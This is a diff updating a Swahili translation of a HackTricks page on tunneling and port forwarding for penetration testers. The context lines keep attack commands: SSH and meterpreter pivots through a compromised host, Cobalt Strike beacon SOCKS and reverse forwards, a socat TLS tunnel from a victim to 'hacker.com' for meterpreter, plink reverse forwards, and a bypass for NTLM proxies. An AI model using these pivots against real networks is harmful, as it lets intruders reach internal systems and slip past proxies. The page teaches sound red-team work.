@@ -1,15 +1,15 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** na **SYN** skani hazitaweza kupitishwa kupitia socks proxies, hivyo lazima **tuondoe ping discovery** (`-Pn`) na kubaini **TCP skani** (`-sT`) ili hii ifanye kazi.
+**ICMP** na **SYN** skana haiwezi kupitishwa kupitia socks proxies, hivyo lazima **tuondoe ping discovery** (`-Pn`) na kubaini **TCP scans** (`-sT`) ili hii ifanye kazi.
 {% endhint %}
 
 ## **Bash**
@@ -65,7 +65,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Porti za ndani --> Kihosti kilichoshambuliwa (SSH) --> Popote
+Porti za ndani --> Kituo kilichovunjwa (SSH) --> Popote
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -109,7 +109,7 @@ Kwa mfano, kupeleka kila traffic inayokwenda 10.10.10.0/24
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Kuungana na ufunguo wa kibinafsi
+Unganisha kwa kutumia funguo binafsi
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Porti za ndani --> Kituo kilichoshambuliwa (sehemu inayofanya kazi) --> Sanduku\_tatu:Port
+Porti za ndani --> Kituo kilichovunjwa (sehemu inayofanya kazi) --> Sanduku\_tatu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Fungua bandari katika teamserver inayosikiliza katika interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
+Fungua bandari katika teamserver inayosikiliza kwenye interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -167,9 +167,9 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Reverse port forward ya Beacon imeundwa ili **kupeleka trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
-- Trafiki **inaelekezwa ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
-- **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
+* Reverse port forward ya Beacon imeundwa ili **kupeleka trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
+* Trafiki **inawekwa ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
+* **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
 
 ### rPort2Port local
 
@@ -211,7 +211,7 @@ Unahitaji kutumia **toleo sawa kwa mteja na seva**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Tumia toleo sawa kwa wakala na proxy**
+**Tumia toleo sawa kwa ajili ya wakala na proxy**
 
 ### Tunneling
 ```bash
@@ -235,7 +235,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Ufunguo wa Wakala na Kusikiliza
+### Agent Binding and Listening
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -296,7 +296,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya wa mwisho kwenye konso ya mwathiriwa:
+Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya wa mwisho kwenye konso ya mwathirika:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Ni kama toleo la console la PuTTY (chaguzi ni sawa na mteja wa ssh).
 
-Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kupeleka tu bandari inayoweza kufikiwa ndani ya eneo la kazi hadi bandari kwenye mashine yetu:
+Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kupeleka tu bandari inayoweza kufikiwa ndani kwa bandari kwenye mashine yetu:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -374,18 +374,18 @@ Sasa, thibitisha kwenye mashine yako (mshambuliaji) kwamba bandari 1080 inasikil
 ```
 netstat -antb | findstr 1080
 ```
-Now you can use [**Proxifier**](https://www.proxifier.com/) **kupanua trafiki kupitia bandari hiyo.**
+Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupanua trafiki kupitia bandari hiyo.**
 
 ## Proxify Windows GUI Apps
 
-You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
-In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
-In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify.
+Unaweza kufanya programu za Windows GUI zipitie kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
+Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
+Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupanua na muunganisho kwa IP unazotaka kupanua.
 
 ## NTLM proxy bypass
 
-The previously mentioned tool: **Rpivot**\
-**OpenVPN** can also bypass it, setting these options in the configuration file:
+Kifaa kilichotajwa hapo awali: **Rpivot**\
+**OpenVPN** pia kinaweza kupita, kuweka chaguzi hizi katika faili la usanidi:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -402,8 +402,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
-Unaweza pia kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza kwenye bandari 2222.
+Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza katika bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
+Unaweza pia kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.
 
 ## YARP
 
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) ni chombo cha kufichua suluhisho kwa Mtandao kwa amri moja.**
-*URI za kufichua ni kama:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **ni chombo cha kufichua suluhisho kwa Mtandao kwa amri moja tu.**\
+&#xNAN;_&#x45;xposition URI ni kama:_ **UID.ngrok.io**
 
-### Usanidi
+### Installation
 
-- Unda akaunti: https://ngrok.com/signup
-- Pakua mteja:
+* Unda akaunti: https://ngrok.com/signup
+* Pakua mteja:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima.*
+_Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._
 
 #### Tunneling TCP
 ```bash
@@ -523,7 +523,7 @@ chmod a+x ./ngrok
 ```
 #### Sniffing HTTP calls
 
-*Inatumika kwa XSS, SSRF, SSTI ...*
+_Muhimu kwa XSS, SSRF, SSTI ..._\
 Moja kwa moja kutoka stdout au katika kiolesura cha HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
@@ -533,11 +533,12 @@ Moja kwa moja kutoka stdout au katika kiolesura cha HTTP [http://127.0.0.1:4040]
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yaml mfano rahisi wa usanidi
+#### ngrok.yaml mfano wa usanidi rahisi
 
-Inafungua mabwawa 3:
-- 2 TCP
-- 1 HTTP na uonyeshaji wa faili za kudumu kutoka /tmp/httpbin/
+Inafungua 3 miji:
+
+* 2 TCP
+* 1 HTTP na uwasilishaji wa faili za kudumu kutoka /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze & fanya mazoezi ya AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & fanya mazoezi ya GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
